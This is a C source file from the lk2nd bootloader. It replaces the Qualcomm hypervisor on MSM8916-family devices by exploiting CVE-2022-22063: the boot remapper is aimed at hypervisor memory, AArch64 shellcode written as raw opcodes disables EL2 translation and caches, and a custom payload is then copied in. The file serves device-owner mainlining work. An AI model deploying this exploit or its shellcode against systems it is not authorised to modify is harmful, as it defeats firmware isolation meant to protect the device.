// SPDX-License-Identifier: BSD-3-Clause
/*
 * Copyright (c) 2021-2022 Stephan Gerhold <stephan@gerhold.net>
 * Copyright (c) 2023 Nikita Travkin <nikita@trvn.ru>
 */

#include <arch/defines.h>
#include <bits.h>
#include <endian.h>
#include <reg.h>
#include <string.h>
#include <debug.h>
#include <scm.h>
#include <board.h>

#include <lk2nd/util/mmu.h>
#include <dt-bindings/arm/qcom,ids.h>

#include "takeover.h"

/**
 * remapper.c - Hyp takeover using the boot remapper feature.
 *
 * This implementation is based on CVE-2022-22063 [1] which allows the user to
 * read and write memory bypassing stage 2 address translation that the usual
 * hyp code uses to secure itself from el1.
 *
 * Implementation uses BOOT_REMAPPER to fill hypervisor image with custom
 * exception handler that disables EL2 MMU and caches and sets the vbar_el2,
 * then copies the new hypervisor payload to the start of the hyp image.
 *
 * [1] https://github.com/msm8916-mainline/CVE-2022-22063
 */

#define HYP_BASE			0x86400000

#define BOOT_REMAP_BASE			0x00000000
#define BOOT_REMAP_SIZE			(128 * 1024)	/* 128 KiB */
#define BOOT_REMAP_END			(BOOT_REMAP_BASE + BOOT_REMAP_SIZE)

/* System Control Register (EL2) */
#define SCTLR_EL2_I	BIT(12)	/* Instruction cache enable */
#define SCTLR_EL2_C	BIT(2)	/* Global enable for data and unifies caches */
#define SCTLR_EL2_M	BIT(0)	/* Global enable for the EL2 MMU */

#define APCS_BOOT_START_ADDR_NSEC	0x0b010008
#define BOOT_128KB_EN			BIT(2)
#define REMAP_EN			BIT(0)

typedef uint32_t a64_instruction_t;

struct aarch64_exc_vec_row {
	a64_instruction_t sync[32];
	a64_instruction_t irq[32];
	a64_instruction_t fiq[32];
	a64_instruction_t serror[32];
};
struct aarch64_exc_vec_table {
	struct aarch64_exc_vec_row current_el_sp_el0;
	struct aarch64_exc_vec_row current_el_sp_elx;
	struct aarch64_exc_vec_row lower_el_aarch64;
	struct aarch64_exc_vec_row lower_el_aarch32;
};

static void invalidate_instruction_cache(void)
{
	dsb();
	__asm__ volatile ("mcr p15, 0, %0, c7, c5, 0" : : "r" (0)); /* ICIALLU */
	dsb();
	isb();
}

/*
 * Inputs:
 *  x0: Bits to clear in the sctlr_el2 system register
 *  x1: Vector base address to set into vbar_el2
 * Returns:
 *  x0: Old vbar_el2 value
 */
static a64_instruction_t hyp_shellcode[] =
{
	/* Disable stage 2 address translation and hypervisor traps */
	LE32(0xd51c111f),	/* msr	hcr_el2, xzr */
	/* Clear upper 32-bit in 64-bit registers */
	LE32(0x92407c00),	/* and	x0, x0, #0xffffffff */
	LE32(0x92407c21),	/* and	x1, x1, #0xffffffff */
	/* Clear system control bits to disable EL2 MMU and caches */
	LE32(0xd53c1002),	/* mrs	x2, sctlr_el2 */
	LE32(0x8a200042),	/* bic	x2, x2, x0 */
	LE32(0xd51c1002),	/* msr	sctlr_el2, x2 */
	/* Save original vector table base address (return in x0) */
	LE32(0xd53cc000),	/* mrs	x0, vbar_el2 */
	/* Load new vector table base address */
	LE32(0xd51cc001),	/* msr	vbar_el2, x1 */
	/* Return */
	LE32(0xd69f03e0),	/* eret */
};

/**
 * get_remapper_reg() - Get remapper register based on the msm-id.
 *
 * Since multiple platrofms can use the same build, and they may have
 * different boot clusters to use, dynamically detect the register.
 *
 * Returns: Register address or 0 if it's not supported.
 */
static uint64_t get_remapper_reg(void) {
	uint32_t msm_id = board_platform_id() & 0x0000ffff;

	switch (msm_id) {
		case QCOM_ID_APQ8016:
		case QCOM_ID_MSM8216:
		case QCOM_ID_MSM8916:
			return 0x0b010008;

		case QCOM_ID_APQ8039:
		case QCOM_ID_MSM8939:
		case QCOM_ID_MSM8976:
			return 0x0b110008;

		default:
			dprintf(INFO, "qhypstub: This platform is not supported. (msm_id=%d)\n", msm_id);
			return 0;
	}
}

int lk2nd_replace_hyp(void *payload, int payload_size, unsigned long vbar_offt)
{
	struct aarch64_exc_vec_table *table;
	uint32_t remapper_reg = get_remapper_reg();
	int ret;

	if (!remapper_reg)
		return -1;

	/* Set boot remapper to hypervisor memory. */
	writel(HYP_BASE | REMAP_EN | BOOT_128KB_EN, remapper_reg);
	dsb(); /* Ensure write has completed before continuing */

	/* Use boot remapper to copy shell code to hypervisor memory. */
	table = (struct aarch64_exc_vec_table *)BOOT_REMAP_BASE;
	for (; table < (struct aarch64_exc_vec_table *)BOOT_REMAP_END; table++)
		memcpy(table->lower_el_aarch32.sync, hyp_shellcode, sizeof(hyp_shellcode));

	/* Ensure CPU does not execute stale code in EL2 */
	invalidate_instruction_cache();

	/* Call shell code to disable running hypervisor. */
	ret = hvc(SCTLR_EL2_I | SCTLR_EL2_C | SCTLR_EL2_M, HYP_BASE + vbar_offt);
	if (ret & (sizeof(*table) - 1)) {
		dprintf(INFO, "HVC to shell code failed: %d\n", ret);
		return -1;
	}

	/*
	 * Hypervisor stage 2 address translation and cache is now disabled,
	 * so new code can be directly written to the hypervisor memory.
	 */

	if (!lk2nd_mmu_map_ram_wt("hyp", HYP_BASE, payload_size))
		return -1;

	memcpy((void*)HYP_BASE, payload, payload_size);

	/*
	 * Invalidating the instruction cache is not necessary here.
	 * The instruction cache in EL2 was disabled by the shell code
	 * and the hypervisor memory region is mapped as write-through in LK.
	 */
	return 0;
}

